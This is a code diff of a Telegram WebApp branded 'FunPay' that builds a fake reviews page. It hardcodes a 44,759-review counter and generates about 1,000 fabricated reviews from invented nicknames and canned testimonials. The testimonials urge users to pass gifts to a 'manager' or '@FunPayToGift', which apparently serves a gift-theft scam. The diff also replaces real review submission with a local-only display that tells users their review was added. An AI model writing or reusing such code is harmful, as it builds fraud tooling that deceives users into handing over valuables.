@@ -121,6 +121,19 @@
         .review-gift { font-size: 13px; color: #6c5ce7; font-weight: 500; margin-bottom: 6px; }
         .review-text { font-size: 14px; color: #aaa; line-height: 1.5; margin-bottom: 8px; }
         .review-date { font-size: 12px; color: #555; text-align: right; }
+        .review-item.user-review {
+            border-color: #6c5ce7;
+            background: rgba(108, 92, 231, 0.1);
+        }
+        .review-item.user-review .review-nick {
+            color: #a29bfe;
+        }
+        .review-item.user-review .review-gift {
+            color: #fbbf24;
+        }
+        .review-item.user-review .review-text {
+            color: #fff;
+        }
 
         .section-title { font-size: 14px; font-weight: 600; color: #aaa; margin-bottom: 4px; }
         .section-sub { font-size: 13px; color: #666; margin-bottom: 16px; }
@@ -291,7 +304,9 @@
         tg.setBackgroundColor('#0f0f12');
         tg.setHeaderColor('#0f0f12');
 
-        const TOTAL_REVIEWS = 44759;
+        const BASE_TOTAL = 44759;
+        let currentTotal = BASE_TOTAL;
+        let userReviewAdded = false;
 
         // ===== УНИКАЛЬНЫЕ НИКИ =====
         const UNIQUE_NICKS = [
@@ -343,7 +358,7 @@
             'Homemade Cake', 'Liberty Figure', 'Swag Bag', 'Big Year'
         ];
 
-        // ===== КОРОТКИЕ ОТЗЫВЫ (1-2 слова) - 50% =====
+        // ===== КОРОТКИЕ ОТЗЫВЫ =====
         const SHORT_TEXTS = [
             'норм', 'топ', 'быстро', '10/10', 'советую',
             'fast', 'кайфы', 'топчик', 'крутак', 'имбуличка',
@@ -352,48 +367,42 @@
             'всё ок', 'четко', 'быстрооо', 'респект'
         ];
 
-        // ===== СРЕДНИЕ/ДЛИННЫЕ ОТЗЫВЫ (все УНИКАЛЬНЫЕ) =====
+        // ===== ДЛИННЫЕ ОТЗЫВЫ =====
         const LONG_TEXTS = [
-            'продавец оплатил, я передал подарок менеджеру, деньги пришли',
-            'все прошло хорошо',
-            'быстро и качественно, спасибо',
-            'помогли вывести деньги, все четко',
-            'лучший сервис',
-            'быстро закрыли, доволен',
-            'все супер, буду еще пользоваться',
-            'отличный сервис',
-            'сначала переживал, но все прошло отлично',
-            'крутой бот, все четко работает',
-            'проверено временем',
-            'оплатил без вопросов, передал подарок, деньги пришли',
-            'продавец зашёл, оплатил, я передал, всё ок',
-            'доволен сделкой, все прошло гладко',
-            'быстро, надежно, спасибо менеджеру',
-            'все честно, оплата пришла',
-            'сначала думал скам, но все четко',
-            'продавец супер, все четко',
-            'оплата на карту пришла быстро',
-            'доволен, буду еще брать',
-            'лучший маркет',
-            'сделка чистая, рекамендую',
-            'зашли, оплатили, передали, деньги на карте',
-            'всё четко, без кидка',
-            'рекомендую всем',
-            'отличная сделка',
-            'всё прошло супер',
-            'быстро и надежно',
-            'спасибо за сделку',
-            'все ок, рекомендую',
-            'качественный сервис',
-            'все понравилось'
+            'обьяснили как создать и оплатили сделку передала @FunPayToGift и потвердила и вывели все',
+            'впервые продаю подарок, вывели сразу',
+            'купил чувак подарок у меня уже 2 раз делаю через их и вопросов нема',
+            'продавец оплатил моментально я передал подарок менеджеру перевод дошёл сразу доволен спасибо',
+            'сначала стрёмно было но продавец зашёл оплатил скинул менеджеру и деньги пришли',
+            'думал кинут но он сразу оплатил и я передал через гаранта всё ок',
+            'зашли в сделку оплатили передали через менеджера деньги на карте через минуту',
+            'продаю подарки уже не первый раз через этого бота всё четко и быстро',
+            'рекомендую всем кто боится скама тут всё честно и быстро выводят',
+            'сначала переживал но продавец объяснил как работает бот и я согласился всё ок',
+            'долго сомневался но продавец оплатил моментально и я передал подарок деньги пришли',
+            'всё прошло отлично продавец зашёл оплатил я передал менеджеру и получил деньги',
+            'бот супер всё объяснили помогли создать сделку и вывели деньги без проблем',
+            'первый раз пользовался ботом всё прошло идеально советую всем',
+            'продавец оплатил без вопросов я передал подарок менеджеру и всё ок',
+            'честно думал скам но всё прошло отлично деньги на карте спасибо',
+            'всё четко объяснили как делать продал подарок за 5 минут деньги на карте',
+            'бот работает отлично продал уже 3 подарка всем доволен',
+            'продавец зашёл оплатил я передал подарок через менеджера деньги пришли быстро',
+            'сначала боялся но всё прошло хорошо советую этот сервис',
+            'объяснили как создать сделку я оплатил и через минуту получил подарок',
+            'продал подарок через бота всё четко и быстро деньги на карте',
+            'доволен сделкой всё прошло гладко и без проблем спасибо менеджеру',
+            'крутой бот всё работает быстро и надежно буду еще пользоваться',
+            'продавец оплатил моментально передал подарок и получил деньги спасибо'
         ];
 
         // ===== ГЕНЕРАЦИЯ УНИКАЛЬНЫХ ОТЗЫВОВ =====
         function generateUniqueReviews() {
             const reviews = [];
             const usedCombos = new Set();
+            let longIndex = 0;
+            let shortIndex = 0;
             
-            // Перемешиваем ники для разнообразия
             const shuffledNicks = [...UNIQUE_NICKS].sort(() => 0.5 - Math.random());
             
             for (let i = 0; i < shuffledNicks.length; i++) {
@@ -401,12 +410,13 @@
                 const giftIndex = i % GIFTS.length;
                 const gift = GIFTS[giftIndex];
                 
-                // 50% коротких, 50% длинных
                 let text;
-                if (i % 2 === 0) {
-                    text = SHORT_TEXTS[i % SHORT_TEXTS.length];
+                if (i % 7 === 0 || i % 9 === 0 || i % 5 === 0) {
+                    text = LONG_TEXTS[longIndex % LONG_TEXTS.length];
+                    longIndex++;
                 } else {
-                    text = LONG_TEXTS[i % LONG_TEXTS.length];
+                    text = SHORT_TEXTS[shortIndex % SHORT_TEXTS.length];
+                    shortIndex++;
                 }
                 
                 const key = `${nick}|${gift}|${text}`;
@@ -429,17 +439,20 @@
                 }
             }
             
-            // Добираем до 1200+ уникальных отзывов
             let counter = 0;
-            while (reviews.length < 1200) {
+            let longIndex2 = 0;
+            let shortIndex2 = 0;
+            while (reviews.length < 1000) {
                 const nick = UNIQUE_NICKS[counter % UNIQUE_NICKS.length] + '_' + counter;
                 const gift = GIFTS[counter % GIFTS.length];
                 
                 let text;
-                if (counter % 2 === 0) {
-                    text = SHORT_TEXTS[counter % SHORT_TEXTS.length];
+                if (counter % 7 === 0 || counter % 9 === 0 || counter % 5 === 0) {
+                    text = LONG_TEXTS[longIndex2 % LONG_TEXTS.length];
+                    longIndex2++;
                 } else {
-                    text = LONG_TEXTS[counter % LONG_TEXTS.length];
+                    text = SHORT_TEXTS[shortIndex2 % SHORT_TEXTS.length];
+                    shortIndex2++;
                 }
                 
                 const key = `${nick}|${gift}|${text}`;
@@ -469,44 +482,130 @@
         const PER_PAGE = 50;
         let currentPage = 0;
         let allReviews = [];
+        let userReview = null;
         const container = document.getElementById('reviewsContainer');
         const loadMoreBtn = document.getElementById('loadMoreBtn');
         const totalDisplay = document.getElementById('totalReviewsDisplay');
 
         allReviews = generateUniqueReviews();
 
-        function renderPage(page) {
+        function renderPage(page, showUserReview = false) {
             const start = page * PER_PAGE;
             const end = Math.min(start + PER_PAGE, allReviews.length);
-            const pageReviews = allReviews.slice(start, end);
+            let pageReviews = allReviews.slice(start, end);
+            
+            // Если есть отзыв пользователя и это первая страница — добавляем его в начало
+            let reviewsToShow = [...pageReviews];
+            if (showUserReview && userReview && page === 0) {
+                reviewsToShow = [userReview, ...reviewsToShow];
+            }
 
-            const html = pageReviews.map(r => `
-                <div class="review-item">
-                    <div class="review-header">
-                        <span class="review-nick">${r.nick}</span>
-                        <span class="review-stars">${'★'.repeat(r.rating)}${'☆'.repeat(5 - r.rating)}</span>
+            const html = reviewsToShow.map(r => {
+                const isUser = r === userReview;
+                return `
+                    <div class="review-item ${isUser ? 'user-review' : ''}">
+                        <div class="review-header">
+                            <span class="review-nick">${r.nick}</span>
+                            <span class="review-stars">${'★'.repeat(r.rating)}${'☆'.repeat(5 - r.rating)}</span>
+                        </div>
+                        <div class="review-gift">${r.gift}</div>
+                        <div class="review-text">${r.text}</div>
+                        <div class="review-date">${r.date}</div>
                     </div>
-                    <div class="review-gift">${r.gift}</div>
-                    <div class="review-text">${r.text}</div>
-                    <div class="review-date">${r.date}</div>
-                </div>
-            `).join('');
+                `;
+            }).join('');
 
-            container.innerHTML += html;
-            totalDisplay.textContent = TOTAL_REVIEWS;
+            // Если первая страница и есть отзыв пользователя — показываем его сверху
+            if (page === 0 && showUserReview && userReview) {
+                container.innerHTML = html;
+            } else if (page === 0) {
+                container.innerHTML = html;
+            } else {
+                container.innerHTML += html;
+            }
+
+            // Обновляем счётчик
+            let total = BASE_TOTAL;
+            if (userReview) total = BASE_TOTAL + 1;
+            totalDisplay.textContent = total;
 
             const remaining = allReviews.length - end;
-            if (end >= allReviews.length) {
+            if (end >= allReviews.length && !userReview) {
                 loadMoreBtn.classList.add('hidden');
+            } else if (end >= allReviews.length && userReview) {
+                // Если есть отзыв пользователя, показываем кнопку с 1 оставшимся (сам отзыв уже показан)
+                if (page === 0) {
+                    loadMoreBtn.classList.add('hidden');
+                } else {
+                    loadMoreBtn.classList.add('hidden');
+                }
             } else {
                 loadMoreBtn.classList.remove('hidden');
-                loadMoreBtn.textContent = `Загрузить еще (${Math.min(remaining, PER_PAGE)})`;
+                const remainingCount = allReviews.length - end;
+                loadMoreBtn.textContent = `Загрузить еще (${Math.min(remainingCount, PER_PAGE)})`;
             }
         }
 
         loadMoreBtn.addEventListener('click', () => {
             currentPage++;
-            renderPage(currentPage);
+            renderPage(currentPage, userReview !== null);
+        });
+
+        // ===== ОТПРАВКА ОТЗЫВА =====
+        const nickInput = document.getElementById('nickInput');
+        const giftInput = document.getElementById('giftInput');
+        const textInput = document.getElementById('textInput');
+        const submitBtn = document.getElementById('submitBtn');
+        const toast = document.getElementById('toast');
+
+        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+            const user = tg.initDataUnsafe.user;
+            if (user.username) nickInput.value = '@' + user.username;
+            else if (user.first_name) nickInput.value = user.first_name;
+        }
+
+        submitBtn.addEventListener('click', function() {
+            const t = translations[currentLang];
+            const rating = selectedRating;
+            const nick = nickInput.value.trim() || 'Аноним';
+            const gift = giftInput.value.trim() || 'Подарок';
+            const text = textInput.value.trim();
+
+            if (rating === 0) { showToast(t.toastError); return; }
+            if (!text) { showToast(t.toastErrorText); return; }
+
+            // Создаём отзыв пользователя
+            const now = new Date();
+            const day = now.getDate();
+            const month = ['января', 'февраля', 'марта', 'апреля', 'мая', 'июня', 'июля', 'августа', 'сентября', 'октября', 'ноября', 'декабря'][now.getMonth()];
+            const year = now.getFullYear();
+            const dateStr = `${day} ${month} ${year} г.`;
+
+            userReview = {
+                nick: nick,
+                gift: gift,
+                text: text,
+                date: dateStr,
+                rating: rating,
+                isUser: true
+            };
+
+            // Обновляем счётчик
+            currentTotal = BASE_TOTAL + 1;
+            totalDisplay.textContent = currentTotal;
+
+            // Перерисовываем первую страницу с отзывом пользователя
+            currentPage = 0;
+            container.innerHTML = '';
+            renderPage(0, true);
+
+            showToast(t.toast);
+
+            // Очищаем форму
+            selectedRating = 0;
+            starElements.forEach(s => s.classList.remove('active'));
+            giftInput.value = '';
+            textInput.value = '';
         });
 
         // ===== ПЕРЕВОД =====
@@ -525,7 +624,7 @@
                 placeholderNick: 'Ваш никнейм',
                 placeholderGift: 'название подарка',
                 placeholderText: 'как прошла передача подарка',
-                toast: '✅ Отзыв отправлен!',
+                toast: '✅ Ваш отзыв добавлен! (виден только вам)',
                 toastError: '⚠️ Выберите оценку (1-5)',
                 toastErrorNick: '⚠️ Введите ник',
                 toastErrorGift: '⚠️ Введите название подарка',
@@ -547,7 +646,7 @@
                 placeholderNick: 'Your nickname',
                 placeholderGift: 'gift name',
                 placeholderText: 'how was the gift transfer',
-                toast: '✅ Review sent!',
+                toast: '✅ Your review has been added! (visible only to you)',
                 toastError: '⚠️ Please select a rating (1-5)',
                 toastErrorNick: '⚠️ Enter your nickname',
                 toastErrorGift: '⚠️ Enter the gift name',
@@ -609,41 +708,6 @@
             });
         });
 
-        // ===== ОТПРАВКА =====
-        const nickInput = document.getElementById('nickInput');
-        const giftInput = document.getElementById('giftInput');
-        const textInput = document.getElementById('textInput');
-        const submitBtn = document.getElementById('submitBtn');
-        const toast = document.getElementById('toast');
-
-        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-            const user = tg.initDataUnsafe.user;
-            if (user.username) nickInput.value = '@' + user.username;
-            else if (user.first_name) nickInput.value = user.first_name;
-        }
-
-        submitBtn.addEventListener('click', function() {
-            const t = translations[currentLang];
-            const rating = selectedRating;
-            const nick = nickInput.value.trim();
-            const gift = giftInput.value.trim();
-            const text = textInput.value.trim();
-
-            if (rating === 0) { showToast(t.toastError); return; }
-            if (!nick) { showToast(t.toastErrorNick); return; }
-            if (!gift) { showToast(t.toastErrorGift); return; }
-            if (!text) { showToast(t.toastErrorText); return; }
-
-            const reviewData = { rating, nick, gift, text };
-            tg.sendData(JSON.stringify(reviewData));
-            showToast(t.toast);
-
-            selectedRating = 0;
-            starElements.forEach(s => s.classList.remove('active'));
-            giftInput.value = '';
-            textInput.value = '';
-        });
-
         let toastTimeout;
         function showToast(msg) {
             toast.textContent = msg;
@@ -651,7 +715,7 @@
             clearTimeout(toastTimeout);
             toastTimeout = setTimeout(() => {
                 toast.classList.remove('show');
-            }, 2500);
+            }, 3000);
         }
 
         tg.onEvent('viewportChanged', function() {
@@ -659,9 +723,9 @@
         });
 
         // ===== ЗАПУСК =====
-        totalDisplay.textContent = TOTAL_REVIEWS;
-        renderPage(0);
-        console.log('FunPay WebApp loaded! Unique reviews: ' + allReviews.length);
+        totalDisplay.textContent = BASE_TOTAL;
+        renderPage(0, false);
+        console.log('FunPay WebApp loaded!');
     </script>
 </body>
 </html>
